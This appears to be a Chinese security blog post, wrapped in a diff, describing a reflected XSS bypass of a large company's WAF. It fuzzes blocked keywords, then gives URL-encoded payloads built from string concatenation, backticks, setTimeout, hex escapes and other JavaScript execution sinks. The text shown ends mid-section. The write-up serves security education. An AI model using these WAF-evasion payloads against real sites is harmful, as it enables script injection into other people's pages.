@@ -1,0 +1,468 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>硬刚世界500强企业WAF，连斩两枚海外XSS | X1ly?S</title><meta name="author" content="X1ly?S"><meta name="copyright" content="X1ly?S"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言分享两个海外大型SRC厂商的XSS成功绕过WAF的案例，觉得挺有趣的，遂整理成文，大佬们轻喷~ XSS绕过某全球顶级网络设备商首先，URL是这样的 1https:&#x2F;&#x2F;axxx.test.com&#x2F;Cxxxxxxx&#x2F;gxxxxx?Axxxx&#x3D;hxxxx&amp;Bxxxx&#x3D;yxxxx2&amp;Gxxxx&#x3D;yxxxx&amp;Gxxxxx&#x3D;gxxxxx&amp;Kxxxx&#x3D;vxxxxx&amp;L">
+<meta property="og:type" content="article">
+<meta property="og:title" content="硬刚世界500强企业WAF，连斩两枚海外XSS">
+<meta property="og:url" content="https://x1lys.github.io/2025/04/13/%E7%BB%95WAF%E8%BF%9E%E6%96%A9%E4%B8%A4%E6%9E%9A%E6%B5%B7%E5%A4%96XSS/index.html">
+<meta property="og:site_name" content="X1ly?S">
+<meta property="og:description" content="前言分享两个海外大型SRC厂商的XSS成功绕过WAF的案例，觉得挺有趣的，遂整理成文，大佬们轻喷~ XSS绕过某全球顶级网络设备商首先，URL是这样的 1https:&#x2F;&#x2F;axxx.test.com&#x2F;Cxxxxxxx&#x2F;gxxxxx?Axxxx&#x3D;hxxxx&amp;Bxxxx&#x3D;yxxxx2&amp;Gxxxx&#x3D;yxxxx&amp;Gxxxxx&#x3D;gxxxxx&amp;Kxxxx&#x3D;vxxxxx&amp;L">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://x1lys.github.io/img/1.jpg">
+<meta property="article:published_time" content="2025-04-13T15:03:17.000Z">
+<meta property="article:modified_time" content="2025-04-13T15:04:15.971Z">
+<meta property="article:author" content="X1ly?S">
+<meta property="article:tag" content="渗透案例">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://x1lys.github.io/img/1.jpg"><link rel="shortcut icon" href="/img/999.png"><link rel="canonical" href="https://x1lys.github.io/2025/04/13/%E7%BB%95WAF%E8%BF%9E%E6%96%A9%E4%B8%A4%E6%9E%9A%E6%B5%B7%E5%A4%96XSS/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":300,"languages":{"author":"作者: X1ly?S","link":"链接: ","source":"来源: X1ly?S","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '硬刚世界500强企业WAF，连斩两枚海外XSS',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/30.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/11.jpg" onerror="onerror=null;src='/img/47.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">95</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-cogs"></i><span> 技术</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-list-alt"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa-solid fa-heart"></i><span> 爱好</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E5%85%AD%E7%88%BB/"><i class="fa-fw fa-solid fa-bars"></i><span> 六爻</span></a></li><li><a class="site-page child" href="/categories/%E5%86%99%E4%BD%9C/"><i class="fa-fw fas fa-pencil-alt"></i><span> 写作</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-solid fa-users"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/msg/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/1.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1ly?S</span></a><a class="nav-page-title" href="/"><span class="site-name">硬刚世界500强企业WAF，连斩两枚海外XSS</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-cogs"></i><span> 技术</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-list-alt"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa-solid fa-heart"></i><span> 爱好</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E5%85%AD%E7%88%BB/"><i class="fa-fw fa-solid fa-bars"></i><span> 六爻</span></a></li><li><a class="site-page child" href="/categories/%E5%86%99%E4%BD%9C/"><i class="fa-fw fas fa-pencil-alt"></i><span> 写作</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-solid fa-users"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/msg/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">硬刚世界500强企业WAF，连斩两枚海外XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-13T15:03:17.000Z" title="发表于 2025-04-13 23:03:17">2025-04-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-13T15:04:15.971Z" title="更新于 2025-04-13 23:04:15">2025-04-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B/">渗透案例</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2025/04/13/%E7%BB%95WAF%E8%BF%9E%E6%96%A9%E4%B8%A4%E6%9E%9A%E6%B5%B7%E5%A4%96XSS/#post-comment"><span class="waline-comment-count" data-path="/2025/04/13/%E7%BB%95WAF%E8%BF%9E%E6%96%A9%E4%B8%A4%E6%9E%9A%E6%B5%B7%E5%A4%96XSS/"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-04-13 23:04:15&quot;}" hidden></div><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分享两个海外大型SRC厂商的XSS成功绕过WAF的案例，觉得挺有趣的，遂整理成文，大佬们轻喷~</p>
+<h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><h3 id="某全球顶级网络设备商"><a href="#某全球顶级网络设备商" class="headerlink" title="某全球顶级网络设备商"></a>某全球顶级网络设备商</h3><p>首先，URL是这样的</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://axxx.test.com/Cxxxxxxx/gxxxxx?Axxxx=hxxxx&amp;Bxxxx=yxxxx2&amp;Gxxxx=yxxxx&amp;Gxxxxx=gxxxxx&amp;Kxxxx=vxxxxx&amp;Lxxx=nxxxx&amp;Mxxxx=oxxxx=nxxx&amp;Mxxx=xxxx&amp;cxxxxx=ixxx&amp;location=US</span><br></pre></td></tr></table></figure>
+
+<p>既然是找XSS，那么无非就是找输入输出的点，再绕下WAF就可以了，工具这里就不说了，只说手工。可以看到这么多个输入参数，该怎么快速定位到有回显输出的那个参数呢？</p>
+<p>可以直接这样，把每一个参数值都写成一个标记值，比如”X1lyS-1”，”X1lyS-2”，”X1lyS-3”……然后再去响应里搜索标记值，就能快速找出有回显输出的参数</p>
+<p><img src="https://s2.loli.net/2025/04/04/tPKs4uEL2Ymbiqy.png" alt="image-20250404020822689"></p>
+<p>查看源代码，搜索”X1lyS”，由于右键不方便看js代码的结构，每次右键也麻烦，于是推荐使用burp抓包来看就很直观了</p>
+<p>一共搜索到4处回显，选择一处结构最清晰简单的进行下一步测试，因为结构清晰的地方便于构造闭合</p>
+<p><img src="https://s2.loli.net/2025/04/04/zADBKtLYdT4pbM2.png" alt="image-20250404023515796"></p>
+<p>可以看到GET参数”location&#x3D;X1lyS-11”，回显输出在了响应中，”var _location&#x3D;’X1lyS-11’;”，那么就测试这里了</p>
+<p>该处回显点，在前端页面表现为修改地理位置的功能点，所以师傅们以后遇到这种场景就可以考虑测试一下有无XSS</p>
+<p><img src="https://s2.loli.net/2025/04/04/hLJiRdTjKDtXna6.png" alt="image-20250404023804379"></p>
+<p><img src="https://s2.loli.net/2025/04/04/5TbqZeFAMitXcCY.png" alt="image-20250404023653605"></p>
+<p>回显点处的结构很简单，位于script标签内的_location变量的值处</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="comment">// ... [其他变量已隐藏] ...</span></span><br><span class="line"><span class="keyword">var</span> _location=<span class="string">&#x27;X1lyS-11&#x27;</span>;</span><br><span class="line"><span class="comment">// ... [其余代码已虚化] ...</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>既然已经在<code>&lt;script&gt;</code>标签内，那么就直接构造js代码就可以了，不用再写什么html标签</p>
+<p>首先，先闭合逃逸出来_location变量</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;test</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/TRfxSzbP4g5V3Ze.png" alt="image-20250404023502372"></p>
+<p>逃逸成功！没有过滤<code>&#39;</code>，和<code>;</code>符号</p>
+<p>直接写个<code>alert</code>试试呢，最好先不要直接写<code>alert()</code>，为什么呢？因为<code>alert</code>+<code>()</code>是两个变量，<code>alert</code>是一个变量，如果<code>alert()</code>被拦截，根据控制变量法，我们不能一步知道WAF到底是拦截的<code>alert</code>字符串还是<code>()</code>符号，还是两者都拦截？绕过WAF的核心就是一点一点的FUZZ出来WAF到底拦截的是哪一个小部分，然后我们再使用其他可行的方式替换掉这个小部分就能绕过WAF了</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;location=X1lyS-<span class="number">11</span><span class="string">&#x27;;alert</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/HiXGMQufZOTCVzn.png" alt="image-20250404025541319"></p>
+<p>逃逸失效，被WAF转义拦截，说明WAF会拦截<code>alert</code>关键字</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;()</span></span><br></pre></td></tr></table></figure>
+
+<p>直接失去回显，<code>location</code>被设置为了”US”默认值，说明WAF拦截了<code>()</code></p>
+<p><img src="https://s2.loli.net/2025/04/04/Oo7Egzd4D2FcfyI.png" alt="image-20250404054156945"></p>
+<p>那我们先在<code>alert</code>关键字本身做文章，尝试最简单的大小写绕过试试</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;alerT</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/CTGIAHWfUmtNyad.png" alt="image-20250404053101527"></p>
+<p>大小写绕过试试失败</p>
+<p>拼接绕过试试，使用<code>window</code>去拼接<code>alert</code>关键字</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>但是注意<code>()</code>也被拦截了，于是我们使用反引号来绕过，替换<code>()</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;window[&#x27;</span>al<span class="string">&#x27;+&#x27;</span>ert<span class="string">&#x27;]`1`;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/SrXGL7K2MeaIqHT.png" alt="image-20250404054828803"></p>
+<p>这里还需要注意，这个payload里出现了几个特殊字符<code>[]</code>以及反引号，它们都需要被URL编码，不然会导致服务器400格式错误，于是我们修改如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;window%5B%27al%27%2B%27ert%27%5D%601%60%3B</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/vDc82PUxj6roQIM.png" alt="image-20250404055424259"></p>
+<p>成功绕过<code>alert</code>与<code>()</code>的过滤！</p>
+<p>不过还不要忘记加上<code>//</code>，闭合掉后面的js代码，这样语法才能正确，我们插入的js弹窗代码才会被执行</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;window%5B%27al%27%2B%27ert%27%5D%60X1ly?S%60%3B//</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/XuQN7owpLY5fZJt.png" alt="image-20250404055814484"></p>
+<p>在浏览器浏览响应，看看是否成功弹窗</p>
+<p><img src="https://s2.loli.net/2025/04/04/ZR7kBnGzEej9lap.png" alt="image-20250404060152312"></p>
+<p>哟西成功弹窗！</p>
+<p>那除了这种正面绕过方式还有什么呢？反面绕过，也就是寻找没有被过滤的关键字来替代<code>alert</code>证明XSS漏洞存在</p>
+<p>比如，下面几个函数来替换</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用prompt</span></span><br><span class="line"><span class="title function_">prompt</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用confirm</span></span><br><span class="line"><span class="title function_">confirm</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用console.log (不会弹窗但可以验证执行)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/EHdCqPLS8eKwGNI.png" alt="image-20250404061229057"></p>
+<p>经过尝试<code>prompt</code>，<code>confirm</code>也被禁用了，但是<code>console.log</code>没有被禁用，于是直接又找到一种解法</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;console.log%60X1ly%3FS%60//</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/8gLDfj3IakEq6UP.png" alt="image-20250404061555540"></p>
+<p>执行成功！</p>
+<p>如果还想再复杂点该怎么构造呢？使用执行函数嵌套弹窗函数加编码试试</p>
+<p>先看看<code>eval</code>关键字</p>
+<p><img src="https://s2.loli.net/2025/04/04/zq9WcAEYRJ7sQVS.png" alt="image-20250404062209742"></p>
+<p>毫不意外被过滤了，那找一些偏僻点的执行方式试试？</p>
+<p>使用 Function 构造函数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基本用法</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;alert(1)&#x27;</span>)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带参数的用法</span></span><br><span class="line"><span class="title class_">Function</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;(1)&#x27;</span>)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串拼接</span></span><br><span class="line"><span class="title class_">Function</span>(<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert(1)&#x27;</span>)()</span><br></pre></td></tr></table></figure>
+
+<p>使用 setTimeout&#x2F;setInterval</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接使用</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串拼接</span></span><br><span class="line"><span class="built_in">setInterval</span>[<span class="string">&#x27;call&#x27;</span>](<span class="literal">null</span>, <span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert(1)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>使用 location 或 URL 相关方法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过 javascript: 协议</span></span><br><span class="line">location[<span class="string">&#x27;href&#x27;</span>] = <span class="string">&#x27;javascript:alert(1)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 assign</span></span><br><span class="line">location.<span class="title function_">assign</span>(<span class="string">&#x27;javascript:alert(1)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>使用事件处理器</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建事件</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onclick</span> = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加事件监听</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123; <span class="title function_">alert</span>(<span class="number">1</span>) &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>使用动态脚本创建</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建 script 元素</span></span><br><span class="line"><span class="keyword">const</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span><br><span class="line">s.<span class="property">textContent</span> = <span class="string">&#x27;alert(1)&#x27;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s)</span><br></pre></td></tr></table></figure>
+
+<p>使用 import()</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 动态导入</span></span><br><span class="line"><span class="keyword">import</span>(<span class="string">&#x27;data:text/javascript,alert(1)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>使用 with 语句</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 结合 with 语句</span></span><br><span class="line"><span class="title function_">with</span>(<span class="params">&#123;a:<span class="string">&#x27;al&#x27;</span>,b:<span class="string">&#x27;ert&#x27;</span>&#125;</span>) &#123; <span class="variable language_">window</span>[a+b](<span class="number">1</span>) &#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用 Proxy 对象</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过 Proxy 执行</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123; <span class="attr">get</span>: <span class="function">(<span class="params">_, prop</span>) =&gt;</span> prop === <span class="string">&#x27;exec&#x27;</span> &amp;&amp; <span class="title function_">alert</span>(<span class="number">1</span>) &#125;).<span class="property">exec</span></span><br></pre></td></tr></table></figure>
+
+<p>这里就简单展示几个成功的，不全部展示了，都是一样的手法</p>
+<blockquote>
+<p><code>setTimeout</code></p>
+</blockquote>
+<p>注意哈还是要把括号换成反引号</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;setTimeout`alert`1``</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2025/04/04/ywmWKf1Q3j2SYr7.png" alt="image-20250404064445945"></p>
+<p>但是这样是不正确的语法，因为出现了四个反引号，会导致几个反引号配对闭合时产生语法错误，只需要加一个<code>\</code>转义一下内侧的两个反引号就行了，加上注释符号</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location=X1lyS-<span class="number">11</span><span class="string">&#x27;;setTimeout`alert\`1\``//</span></span><br></pre></td></tr></table></figure>
+
+<p>不过，你是不是忘记了什么？<code>alert</code>也被过滤了呀，于是再使用一个十六进制编码下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">al\x65rt</span><br></pre></td></tr></table></figure>
+
+<p>特别注意！这样的编码方式需要被嵌套到执行函数内部才能被正确解析，直接这样是语法错误的</p>
+<p><img src="https://s2.loli.net/2025/04/04/1HZRI6U4XudytoG.png" alt="image-20250404065018501"></p>
+<p>url编码</p>
